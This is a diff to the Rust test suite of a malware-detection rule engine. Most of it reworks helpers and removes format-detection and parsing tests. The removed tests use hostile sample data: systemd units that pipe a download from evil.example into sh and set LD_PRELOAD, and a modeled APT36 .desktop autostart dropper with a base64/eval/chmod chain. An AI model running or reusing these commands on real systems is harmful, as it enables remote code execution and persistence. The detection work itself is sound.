@@ -4,6 +4,7 @@ use crate::composite_rules::context::EvaluationContext;
 use crate::composite_rules::types::FileType;
 use crate::types::{AnalysisReport, TargetInfo};
 use serde_json::json;
+use std::path::Path;
 
 #[test]
 fn json_key_offsets_indexes_nested_paths() {
@@ -45,15 +46,18 @@ fn create_test_ctx_with_file_type<'a>(
     path: &'a std::path::Path,
     file_type: FileType,
 ) -> EvaluationContext<'a> {
-    // Create minimal report with the path we need
-    let report = Box::leak(Box::new(AnalysisReport::new(TargetInfo {
+    // The values tree production evaluates: what filefacts parses and
+    // derives from these bytes under this name.
+    let values = filefacts::OpenOptions::new().path(path).open(binary_data);
+    let mut report = AnalysisReport::new(TargetInfo {
         path: path.display().to_string(),
         file_type: "test".to_string(),
         size_bytes: binary_data.len() as u64,
         sha256: "test".to_string(),
         architectures: None,
-    })));
-
+    });
+    report.values_tree = Some(Box::new(values.values().as_json().clone()));
+    let report: &'static AnalysisReport = Box::leak(Box::new(report));
     EvaluationContext::test_only_new(report, binary_data, file_type)
 }
 
@@ -88,34 +92,23 @@ fn create_test_ctx_with_values_tree<'a>(
     EvaluationContext::test_only_new(leaked, binary_data, file_type)
 }
 
-/// `report.values_tree` is consulted in preference to the file's
-/// own structured-format parsing — even when the binary is empty.
+/// A manifest cannot forge the facts filefacts computes beside its document:
+/// a `composer` key in composer.json is refused, so a rule reading the
+/// computed hook flows never sees it, while ordinary fields still resolve.
 #[test]
-fn computed_command_flows_reject_forged_native_facts() {
+fn computed_command_flows_reject_forged_document_facts() {
     let raw = br#"{"composer":{"install_hook_flows":[{"kind":"forged"}]},"name":"native-field"}"#;
-    let path = Path::new("composer.json");
-    for computed in [serde_json::json!([]), serde_json::json!([{"kind":"real"}])] {
-        let ctx = create_test_ctx_with_values_tree(
-            raw,
-            path,
-            FileType::ComposerJson,
-            serde_json::json!({"composer":{"install_hook_flows":computed}}),
-        );
-        let mut query = KvQuery {
-            path: "composer.install_hook_flows[*].kind".into(),
-            exact: Some("forged".into()),
-            ..Default::default()
-        };
-        assert!(evaluate_kv(&Condition::Kv(query.clone()), &ctx).is_none());
-        query.exact = Some("real".into());
-        assert_eq!(
-            evaluate_kv(&Condition::Kv(query.clone()), &ctx).is_some(),
-            !computed.as_array().unwrap().is_empty()
-        );
-        query.path = "name".into();
-        query.exact = Some("native-field".into());
-        assert!(evaluate_kv(&Condition::Kv(query), &ctx).is_some());
-    }
+    let ctx =
+        create_test_ctx_with_file_type(raw, Path::new("composer.json"), FileType::ComposerJson);
+    let mut query = KvQuery {
+        path: "composer.install_hook_flows[*].kind".into(),
+        exact: Some("forged".into()),
+        ..Default::default()
+    };
+    assert!(evaluate_kv(&Condition::Kv(query.clone()), &ctx).is_none());
+    query.path = "name".into();
+    query.exact = Some("native-field".into());
+    assert!(evaluate_kv(&Condition::Kv(query), &ctx).is_some());
 }
 
 /// `report.values_tree` resolves values for non-manifest analyzers.
@@ -191,46 +184,23 @@ fn synthetic_values_tree_resolves_paths_for_office() {
     assert!(evaluate_kv(&cond, &ctx).is_none());
 }
 
+/// Core Metadata field names are case-insensitive; rules read them
+/// lowercased.
 #[test]
-fn native_pkginfo_parser_still_applies_with_synthetic_values_tree() {
+fn pkginfo_fields_are_read_lowercased() {
     let pkginfo = b"Metadata-Version: 2.4
 Name: tap-wordpress
 Summary: Security research - dependency confusion PoC
 Author-email: security-research@example.com
 ";
-    let kv = serde_json::json!({
-        "Summary": "Security research - dependency confusion PoC",
-        "Author-email": "security-research@example.com",
-    });
-    let path = std::path::Path::new("METADATA");
-    let ctx = create_test_ctx_with_values_tree(pkginfo, path, FileType::PkgInfo, kv);
-
+    let ctx = create_test_ctx_with_file_type(pkginfo, Path::new("METADATA"), FileType::PkgInfo);
     let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
         path: "summary".to_string(),
-        exact: None,
-        substr: None,
         regex: Some(r"dependency.confusion".to_string()),
-        eq: None,
-        ne: None,
         case_insensitive: true,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
+        ..Default::default()
     });
     assert!(evaluate_kv(&cond, &ctx).is_some());
-}
-
-fn evaluate_kv_test_with_file_type(
-    condition: &Condition,
-    data: &[u8],
-    path: &std::path::Path,
-    file_type: FileType,
-) -> Option<Evidence> {
-    let ctx = create_test_ctx_with_file_type(data, path, file_type);
-    evaluate_kv(condition, &ctx)
 }
 
 // ==========================================================================
@@ -992,153 +962,9 @@ fn test_excessive_keywords_detection() {
 // Format Detection Tests
 // ==========================================================================
 
-#[test]
-fn test_detect_known_json_manifests() {
-    // Only known JSON manifest filenames are detected
-    assert_eq!(
-        detect_format(Path::new("manifest.json"), b""),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("package.json"), b""),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("package-lock.json"), b""),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("composer.json"), b""),
-        StructuredFormat::Json
-    );
-}
-
-#[test]
-fn test_detect_github_actions_workflow() {
-    // GitHub Actions workflows in .github/workflows/ are detected
-    assert_eq!(
-        detect_format(Path::new(".github/workflows/ci.yaml"), b""),
-        StructuredFormat::Yaml
-    );
-    assert_eq!(
-        detect_format(Path::new(".github/workflows/test.yml"), b""),
-        StructuredFormat::Yaml
-    );
-    assert_eq!(
-        detect_format(
-            Path::new("ci.yml"),
-            b"name: CI\non:\n  push:\njobs:\n  test:\n    runs-on: ubuntu-latest"
-        ),
-        StructuredFormat::Yaml
-    );
-}
-
-#[test]
-fn test_detect_known_toml_manifests() {
-    // Known TOML manifests are detected
-    assert_eq!(
-        detect_format(Path::new("Cargo.toml"), b""),
-        StructuredFormat::Toml
-    );
-    assert_eq!(
-        detect_format(Path::new("pyproject.toml"), b""),
-        StructuredFormat::Toml
-    );
-}
-
-#[test]
-fn test_no_detection_for_unknown_json() {
-    // Random JSON files without known filenames are not detected
-    assert_eq!(
-        detect_format(Path::new("unknown"), br#"{"key": "value"}"#),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("random.json"), b"[1, 2, 3]"),
-        StructuredFormat::Unknown
-    );
-}
-
-#[test]
-fn test_no_detection_for_unknown_yaml() {
-    // Random YAML files without known filenames are not detected
-    assert_eq!(
-        detect_format(Path::new("unknown"), b"key: value\nother: 123"),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("config.yaml"), b"key: value"),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(
-            Path::new("config.yaml"),
-            b"name: value\non: push\njobs_enabled: true"
-        ),
-        StructuredFormat::Unknown
-    );
-}
-
-#[test]
-fn test_no_detection_for_unknown_toml() {
-    // Random TOML files without known filenames are not detected
-    assert_eq!(
-        detect_format(Path::new("unknown"), b"[package]\nname = \"foo\""),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("config.toml"), b"key = \"value\""),
-        StructuredFormat::Unknown
-    );
-}
-
 // ==========================================================================
 // File Rejection Tests
 // ==========================================================================
-
-#[test]
-fn test_reject_random_json_files() {
-    // Random .json files should not be parsed
-    let json_content = br#"{"api_key": "secret123", "endpoint": "https://evil.com"}"#;
-
-    // Random filenames with .json extension are rejected
-    assert_eq!(
-        detect_format(Path::new("config.json"), json_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("data.json"), json_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("settings.json"), json_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("/path/to/random.json"), json_content),
-        StructuredFormat::Unknown
-    );
-
-    // Verify kv evaluation also returns None
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "api_key".to_string(),
-        exact: Some("secret123".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, json_content, Path::new("random.json")).is_none());
-    assert!(evaluate_kv_test(&cond, json_content, Path::new("config.json")).is_none());
-}
 
 #[test]
 fn is_validator_gates_a_value_condition() {
@@ -1230,473 +1056,6 @@ fn not_exclusion_filters_a_matched_value() {
         "excluded value: {}",
         ev.value
     );
-}
-
-#[test]
-fn test_reject_random_yaml_files() {
-    // Random .yaml/.yml files should not be parsed
-    let yaml_content = b"database:\n  host: localhost\n  password: secret";
-
-    // Random YAML files are rejected
-    assert_eq!(
-        detect_format(Path::new("config.yaml"), yaml_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("docker-compose.yml"), yaml_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("settings.yml"), yaml_content),
-        StructuredFormat::Unknown
-    );
-
-    // Verify kv evaluation returns None
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "database.password".to_string(),
-        exact: Some("secret".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, yaml_content, Path::new("config.yaml")).is_none());
-}
-
-#[test]
-fn test_reject_random_toml_files() {
-    // Random .toml files should not be parsed
-    let toml_content = b"[database]\nhost = \"localhost\"\npassword = \"secret\"";
-
-    // Random TOML files are rejected
-    assert_eq!(
-        detect_format(Path::new("config.toml"), toml_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("settings.toml"), toml_content),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("app.toml"), toml_content),
-        StructuredFormat::Unknown
-    );
-
-    // Verify kv evaluation returns None
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "database.password".to_string(),
-        exact: Some("secret".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, toml_content, Path::new("config.toml")).is_none());
-}
-
-#[test]
-fn test_accept_known_json_manifests() {
-    // Known JSON manifests should still be parsed
-    let package_json = br#"{"name": "malicious-package", "version": "1.0.0"}"#;
-    let manifest_json = br#"{"manifest_version": 2, "permissions": ["storage"]}"#;
-    let composer_json = br#"{"name": "vendor/package", "require": {}}"#;
-
-    // Verify detection works
-    assert_eq!(
-        detect_format(Path::new("package.json"), package_json),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("manifest.json"), manifest_json),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("composer.json"), composer_json),
-        StructuredFormat::Json
-    );
-
-    // Verify kv evaluation works
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "name".to_string(),
-        exact: Some("malicious-package".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, package_json, Path::new("package.json")).is_some());
-}
-
-#[test]
-fn test_accept_known_toml_manifests() {
-    // Known TOML manifests should still be parsed
-    let cargo_toml = b"[package]\nname = \"malicious-crate\"\nversion = \"0.1.0\"";
-    let pyproject_toml = b"[project]\nname = \"malicious-package\"\nversion = \"1.0.0\"";
-
-    // Verify detection works
-    assert_eq!(
-        detect_format(Path::new("Cargo.toml"), cargo_toml),
-        StructuredFormat::Toml
-    );
-    assert_eq!(
-        detect_format(Path::new("pyproject.toml"), pyproject_toml),
-        StructuredFormat::Toml
-    );
-
-    // Verify kv evaluation works
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "package.name".to_string(),
-        exact: Some("malicious-crate".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, cargo_toml, Path::new("Cargo.toml")).is_some());
-}
-
-#[test]
-fn test_accept_github_actions_workflows() {
-    // GitHub Actions workflows should be parsed
-    let workflow = b"name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest";
-
-    // Both .yml and .yaml in .github/workflows/ should work
-    assert_eq!(
-        detect_format(Path::new(".github/workflows/ci.yml"), workflow),
-        StructuredFormat::Yaml
-    );
-    assert_eq!(
-        detect_format(Path::new(".github/workflows/test.yaml"), workflow),
-        StructuredFormat::Yaml
-    );
-
-    // Non-workflow locations still work if the YAML has workflow structure.
-    assert_eq!(
-        detect_format(Path::new(".github/ci.yml"), workflow),
-        StructuredFormat::Yaml
-    );
-    assert_eq!(
-        detect_format(Path::new("ci.yml"), workflow),
-        StructuredFormat::Yaml
-    );
-
-    // Verify kv evaluation works for workflows
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "name".to_string(),
-        exact: Some("CI".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, workflow, Path::new(".github/workflows/ci.yml")).is_some());
-    assert!(evaluate_kv_test(&cond, workflow, Path::new("ci.yml")).is_some());
-}
-
-#[test]
-fn test_reject_json_with_valid_content_but_wrong_filename() {
-    // Even if content is valid JSON, reject if filename is unknown
-    let valid_json = br#"{"perfectly": "valid", "json": true}"#;
-
-    assert_eq!(
-        detect_format(Path::new("database.json"), valid_json),
-        StructuredFormat::Unknown
-    );
-    assert_eq!(
-        detect_format(Path::new("api-config.json"), valid_json),
-        StructuredFormat::Unknown
-    );
-
-    // Verify kv evaluation doesn't work
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "perfectly".to_string(),
-        exact: Some("valid".to_string()),
-        substr: None,
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-
-    assert!(evaluate_kv_test(&cond, valid_json, Path::new("database.json")).is_none());
-}
-
-#[test]
-fn test_case_insensitive_filename_matching() {
-    // Filenames should be matched case-insensitively
-    let json_content = br#"{"test": "value"}"#;
-
-    assert_eq!(
-        detect_format(Path::new("Package.json"), json_content),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("PACKAGE.JSON"), json_content),
-        StructuredFormat::Json
-    );
-    assert_eq!(
-        detect_format(Path::new("Manifest.JSON"), json_content),
-        StructuredFormat::Json
-    );
-
-    let toml_content = b"[package]\nname = \"test\"";
-    assert_eq!(
-        detect_format(Path::new("cargo.TOML"), toml_content),
-        StructuredFormat::Toml
-    );
-    assert_eq!(
-        detect_format(Path::new("PyProject.toml"), toml_content),
-        StructuredFormat::Toml
-    );
-}
-
-#[test]
-fn test_detect_systemd_service_files() {
-    let service = b"[Unit]\nDescription=Updater\n[Service]\nExecStart=/bin/true\n";
-    assert_eq!(
-        detect_format(Path::new("evil.service"), service),
-        StructuredFormat::SystemdService
-    );
-    assert_eq!(
-        detect_format(
-            Path::new("/etc/systemd/system/ssh.service.d/override.conf"),
-            service
-        ),
-        StructuredFormat::SystemdService
-    );
-}
-
-#[test]
-fn test_parse_systemd_service_structure() {
-    let service = br#"
-# leading comment
-[Unit]
-Description=Updater
-After=network-online.target auditd.service
-
-[Service]
-Type=simple
-Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
-ExecStart=/bin/old
-ExecStart=
-ExecStart=/bin/bash -c \
-# comment in continued block should be ignored
-  curl -fsSL https://evil.example/payload.sh | sh
-ExecStartPre=/usr/bin/test -x /bin/bash
-ReadWritePaths=/etc/systemd/system /tmp
-
-[Install]
-WantedBy=multi-user.target graphical.target
-"#;
-
-    let parsed = parse_systemd_service(service).expect("systemd service should parse");
-
-    let exec_start = navigate(&parsed, &parse_path("service.exec_start").unwrap());
-    assert_eq!(exec_start.len(), 1);
-    assert_eq!(
-        exec_start[0],
-        &json!("/bin/bash -c curl -fsSL https://evil.example/payload.sh | sh")
-    );
-
-    let exec_start_pre = navigate(&parsed, &parse_path("service.exec_start_pre").unwrap());
-    assert_eq!(exec_start_pre, vec![&json!("/usr/bin/test -x /bin/bash")]);
-
-    let env_var = navigate(
-        &parsed,
-        &parse_path("service.environment.LD_PRELOAD").unwrap(),
-    );
-    assert_eq!(env_var, vec![&json!("/tmp/evil.so")]);
-
-    let after = navigate(&parsed, &parse_path("unit.after").unwrap());
-    assert_eq!(
-        after,
-        vec![&json!(["network-online.target", "auditd.service"])]
-    );
-
-    let wanted_by = navigate(&parsed, &parse_path("install.wanted_by").unwrap());
-    assert_eq!(
-        wanted_by,
-        vec![&json!(["multi-user.target", "graphical.target"])]
-    );
-
-    let read_write_paths = navigate(&parsed, &parse_path("service.read_write_paths").unwrap());
-    assert_eq!(
-        read_write_paths,
-        vec![&json!(["/etc/systemd/system", "/tmp"])]
-    );
-}
-
-#[test]
-fn test_parse_desktop_entry_benign() {
-    // Realistic small benign .desktop file (RustDesk)
-    let content = br#"[Desktop Entry]
-Name=RustDesk
-GenericName=Remote Desktop
-Comment=Remote Desktop
-Exec=rustdesk %u
-Icon=rustdesk
-Terminal=false
-Type=Application
-StartupNotify=true
-Categories=Network;RemoteAccess;GTK;
-Keywords=internet;linux;dart;rust;remote-control;p2p;teamviewer;rust-lang;rdp;remote-desktop;vnc;
-Actions=new-window;
-
-[Desktop Action new-window]
-Name=Open a New Window
-Exec=rustdesk %u
-"#;
-
-    let parsed = parse_desktop_entry(content).expect("desktop entry should parse");
-
-    let exec = navigate(&parsed, &parse_path("desktop_entry.exec").unwrap());
-    assert_eq!(exec, vec![&json!("rustdesk %u")]);
-
-    let entry_type = navigate(&parsed, &parse_path("desktop_entry.type").unwrap());
-    assert_eq!(entry_type, vec![&json!("Application")]);
-
-    let terminal = navigate(&parsed, &parse_path("desktop_entry.terminal").unwrap());
-    assert_eq!(terminal, vec![&json!("false")]);
-
-    // Categories is a `;`-separated list → stored as array
-    let categories = navigate(&parsed, &parse_path("desktop_entry.categories").unwrap());
-    assert_eq!(categories, vec![&json!(["Network", "RemoteAccess", "GTK"])]);
-
-    // Secondary section is accessible
-    let action_exec = navigate(
-        &parsed,
-        &parse_path("desktop_action_new_window.exec").unwrap(),
-    );
-    assert_eq!(action_exec, vec![&json!("rustdesk %u")]);
-}
-
-#[test]
-fn test_parse_desktop_entry_apt36_dropper() {
-    // Pattern modeled on the APT36 weaponized .desktop autostart dropper
-    // (CYFIRMA APT36 BOSS-Linux campaign): inline bash -c with base64-decoded
-    // payload, X-GNOME-Autostart-enabled=true, misleading pdf icon.
-    let content = br#"
-# fake embedded thumbnail data
-# iVBORw0KGgrhR6fHOI+odJY
-[Desktop Entry]
-Name=Contract_for_Procurement
-Exec=bash -c 'f(){ echo "$1"|base64 -d|xxd -r -p|base64 -d; }; p="/tmp/.a-$(date +%s%N|md5sum|cut -c1-8)"; v="$(f NTQ0NT==)"; (eval "$v" > "$p" 2>/dev/null && chmod +x "$p" 2>/dev/null && "$p") &'
-Terminal=false
-Type=Application
-Icon=application-pdf
-Categories=Utility;
-X-GNOME-Autostart-enabled=true
-X-KDE-SubstituteUID=false
-X-KDE-Username=root
-"#;
-
-    let parsed = parse_desktop_entry(content).expect("malicious desktop entry should parse");
-
-    // Exec value is fully preserved for trait matching on bash -c / base64 / eval / chmod
-    let exec = navigate(&parsed, &parse_path("desktop_entry.exec").unwrap());
-    assert_eq!(exec.len(), 1);
-    let exec_str = exec[0].as_str().expect("exec is string");
-    assert!(exec_str.contains("bash -c"));
-    assert!(exec_str.contains("base64 -d"));
-    assert!(exec_str.contains("eval"));
-    assert!(exec_str.contains("chmod +x"));
-
-    // Autostart signal
-    let autostart = navigate(
-        &parsed,
-        &parse_path("desktop_entry.x_gnome_autostart_enabled").unwrap(),
-    );
-    assert_eq!(autostart, vec![&json!("true")]);
-
-    // Privilege-hint signal
-    let kde_user = navigate(
-        &parsed,
-        &parse_path("desktop_entry.x_kde_username").unwrap(),
-    );
-    assert_eq!(kde_user, vec![&json!("root")]);
-
-    // Icon/type mismatch hint
-    let icon = navigate(&parsed, &parse_path("desktop_entry.icon").unwrap());
-    assert_eq!(icon, vec![&json!("application-pdf")]);
-}
-
-#[test]
-fn test_parse_desktop_entry_skips_localized_keys() {
-    let content = br#"[Desktop Entry]
-Name=Editor
-Name[cs]=Editor CS
-Name[de]=Editor DE
-Exec=editor %F
-"#;
-    let parsed = parse_desktop_entry(content).expect("desktop entry should parse");
-
-    // Base Name= is kept; localized variants are dropped.
-    let name = navigate(&parsed, &parse_path("desktop_entry.name").unwrap());
-    assert_eq!(name, vec![&json!("Editor")]);
-}
-
-#[test]
-fn test_parse_desktop_entry_list_escapes() {
-    // `\;` in a list value is a literal semicolon, not a separator.
-    let content = br#"[Desktop Entry]
-Keywords=one;two\;still-two;three;
-"#;
-    let parsed = parse_desktop_entry(content).expect("desktop entry should parse");
-    let kw = navigate(&parsed, &parse_path("desktop_entry.keywords").unwrap());
-    assert_eq!(kw, vec![&json!(["one", "two;still-two", "three"])]);
-}
-
-#[test]
-fn test_detect_format_desktop_by_extension() {
-    let path = Path::new("/etc/xdg/autostart/evil.desktop");
-    let format = detect_format(path, b"[Desktop Entry]\nExec=foo\n");
-    assert_eq!(format, StructuredFormat::DesktopEntry);
 }
 
 #[test]
@@ -1823,114 +1182,6 @@ fn test_evaluate_kv_systemd_service_drop_in() {
         not: None,
     });
     assert!(evaluate_kv_test(&cond, service, path).is_some());
-}
-
-#[test]
-fn test_evaluate_kv_systemd_service_file_type_override() {
-    let service = b"[Service]\nExecStart=/bin/bash -c curl https://evil.example | sh\n";
-    let path = Path::new("suspicious.txt");
-    let cond = Condition::Kv(KvQuery {
-        match_mode: Default::default(),
-        path: "service.exec_start".to_string(),
-        exact: None,
-        substr: Some("evil.example".to_string()),
-        regex: None,
-        eq: None,
-        ne: None,
-        case_insensitive: false,
-        exists: None,
-        length_min: None,
-        length_max: None,
-        is_check: None,
-        not: None,
-    });
-    assert!(
-        evaluate_kv_test_with_file_type(&cond, service, path, FileType::SystemdService).is_some()
-    );
-}
-
-#[test]
-fn test_parse_systemd_service_environment_reset_and_raw_tracking() {
-    let service = br#"
-[Service]
-Environment="LD_PRELOAD=/tmp/old.so" "URL=https://old.example/payload.sh"
-Environment=
-Environment="LD_PRELOAD=/tmp/new.so" PATH=/tmp/bin
-ExecStart=/bin/old
-ExecStart=
-ExecStart=/bin/new
-"#;
-
-    let parsed = parse_systemd_service(service).expect("systemd service should parse");
-
-    let ld_preload = navigate(
-        &parsed,
-        &parse_path("service.environment.LD_PRELOAD").unwrap(),
-    );
-    assert_eq!(ld_preload, vec![&json!("/tmp/new.so")]);
-
-    let old_url = navigate(&parsed, &parse_path("service.environment.URL").unwrap());
-    assert!(
-        old_url.is_empty(),
-        "Environment= reset should clear old keys"
-    );
-
-    let env_list = navigate(&parsed, &parse_path("service.environment_list").unwrap());
-    assert_eq!(
-        env_list,
-        vec![&json!(["LD_PRELOAD=/tmp/new.so", "PATH=/tmp/bin"])]
-    );
-
-    let raw_env = navigate(&parsed, &parse_path("service._raw.environment").unwrap());
-    assert_eq!(
-        raw_env,
-        vec![&json!("\"LD_PRELOAD=/tmp/new.so\" PATH=/tmp/bin")]
-    );
-
-    let exec_start = navigate(&parsed, &parse_path("service.exec_start").unwrap());
-    assert_eq!(exec_start, vec![&json!("/bin/new")]);
-
-    let raw_exec_start = navigate(&parsed, &parse_path("service._raw.exec_start").unwrap());
-    assert_eq!(raw_exec_start, vec![&json!("/bin/new")]);
-}
-
-#[test]
-fn test_parse_systemd_service_escaped_items_and_semicolon_comments() {
-    let service = br#"
-; leading comment
-[Service]
-ReadOnlyPaths=/opt/my\sdir "/srv/quoted path"
-Environment='GREETING=hello world' PATH=/tmp/my\sbin
-ExecStartPre=/bin/echo start \
-; comment inside continued block
-  done
-"#;
-
-    let parsed = parse_systemd_service(service).expect("systemd service should parse");
-
-    let read_only_paths = navigate(&parsed, &parse_path("service.read_only_paths").unwrap());
-    assert_eq!(
-        read_only_paths,
-        vec![&json!(["/opt/my dir", "/srv/quoted path"])]
-    );
-
-    let greeting = navigate(
-        &parsed,
-        &parse_path("service.environment.GREETING").unwrap(),
-    );
-    assert_eq!(greeting, vec![&json!("hello world")]);
-
-    let path_value = navigate(&parsed, &parse_path("service.environment.PATH").unwrap());
-    assert_eq!(path_value, vec![&json!("/tmp/my bin")]);
-
-    let env_list = navigate(&parsed, &parse_path("service.environment_list").unwrap());
-    assert_eq!(
-        env_list,
-        vec![&json!(["GREETING=hello world", "PATH=/tmp/my bin"])]
-    );
-
-    let exec_start_pre = navigate(&parsed, &parse_path("service.exec_start_pre").unwrap());
-    assert_eq!(exec_start_pre, vec![&json!("/bin/echo start done")]);
 }
 
 #[test]
@@ -2486,27 +1737,6 @@ fn test_malformed_json() {
 // ==========================================================================
 
 #[test]
-fn test_detect_pkginfo_by_filename() {
-    assert_eq!(
-        detect_format(Path::new("PKG-INFO"), b""),
-        StructuredFormat::PkgInfo
-    );
-    assert_eq!(
-        detect_format(Path::new("METADATA"), b""),
-        StructuredFormat::PkgInfo
-    );
-}
-
-#[test]
-fn test_detect_pkginfo_by_content() {
-    let content = b"Metadata-Version: 2.1\nName: my-package\n";
-    assert_eq!(
-        detect_format(Path::new("unknown"), content),
-        StructuredFormat::PkgInfo
-    );
-}
-
-#[test]
 fn test_pkginfo_simple() {
     let pkginfo = b"Metadata-Version: 2.1
 Name: malicious-package
@@ -2657,52 +1887,6 @@ Classifier: Programming Language :: Python :: 3
 }
 
 #[test]
-fn test_pkginfo_body_cannot_supply_or_override_headers() {
-    for newline in ["\n", "\r\n"] {
-        let headers = [
-            "Metadata-Version: 2.4",
-            "Name: declared-package",
-            "Version: 1.0",
-            "",
-            "Name: description-example",
-            "Requires-Dist: example-dependency",
-            "License-Expression: MIT",
-            "Description-Content-Type: text/markdown",
-        ]
-        .join(newline);
-        let parsed = parse_pkginfo(headers.as_bytes()).unwrap();
-        assert_eq!(
-            parsed,
-            serde_json::json!({
-                "metadata-version": "2.4",
-                "name": "declared-package",
-                "version": "1.0"
-            })
-        );
-    }
-}
-
-#[test]
-fn test_pkginfo_boundary_preserves_folded_and_repeated_headers() {
-    let metadata = concat!(
-        "Metadata-Version: 2.4\n",
-        "Name: declared-package\n",
-        "Summary: Short\n",
-        " continuation\n",
-        "Requires-Dist: first-dependency\n",
-        "Requires-Dist: second-dependency\n",
-        "\n",
-        "Requires-Dist: description-example\n"
-    );
-    let parsed = parse_pkginfo(metadata.as_bytes()).unwrap();
-    assert_eq!(parsed["summary"], "Short\ncontinuation");
-    assert_eq!(
-        parsed["requires-dist"],
-        serde_json::json!(["first-dependency", "second-dependency"])
-    );
-}
-
-#[test]
 fn test_pkginfo_multiline_description() {
     let pkginfo = b"Metadata-Version: 2.1
 Name: my-package
@@ -2763,32 +1947,6 @@ Author-Email: test@example.com
 // ==========================================================================
 // Plist Format Tests
 // ==========================================================================
-
-#[test]
-fn test_detect_plist_by_extension() {
-    assert_eq!(
-        detect_format(Path::new("Info.plist"), b""),
-        StructuredFormat::Plist
-    );
-}
-
-#[test]
-fn test_detect_xml_plist_by_content() {
-    let content = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>test</string>\n</dict>\n</plist>";
-    assert_eq!(
-        detect_format(Path::new("unknown"), content),
-        StructuredFormat::Plist
-    );
-}
-
-#[test]
-fn test_detect_binary_plist_by_content() {
-    let content = b"bplist00\xd1\x01\x02STest\x08\x0b\x10\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15";
-    assert_eq!(
-        detect_format(Path::new("unknown"), content),
-        StructuredFormat::Plist
-    );
-}
 
 #[test]
 fn test_xml_plist_evaluation() {
@@ -3404,9 +2562,9 @@ fn integration_pe_filename_masquerade() {
     // disagrees with the on-disk basename → renamed binary.
     let ctx = ctx_with_values(json!({
         "file": {"basename": "update.exe"},
-        "pe": {"version_info": {"original_filename": "mimikatz.exe"}},
+        "pe": {"version": {"original_filename": "mimikatz.exe"}},
     }));
-    let cond = kv_ne("file.basename", "pe.version_info.original_filename");
+    let cond = kv_ne("file.basename", "pe.version.original_filename");
     assert!(evaluate_kv(&cond, &ctx).is_some());
 }
 
@@ -3414,9 +2572,9 @@ fn integration_pe_filename_masquerade() {
 fn integration_pe_filename_matches_no_match() {
     let ctx = ctx_with_values(json!({
         "file": {"basename": "notepad.exe"},
-        "pe": {"version_info": {"original_filename": "notepad.exe"}},
+        "pe": {"version": {"original_filename": "notepad.exe"}},
     }));
-    let cond = kv_ne("file.basename", "pe.version_info.original_filename");
+    let cond = kv_ne("file.basename", "pe.version.original_filename");
     assert!(evaluate_kv(&cond, &ctx).is_none());
 }
 
@@ -3526,46 +2684,4 @@ fn integration_wheel_filename_matches_metadata_no_match() {
 
     let cond = kv_ne("whl.filename.name_prefix", "METADATA::Name");
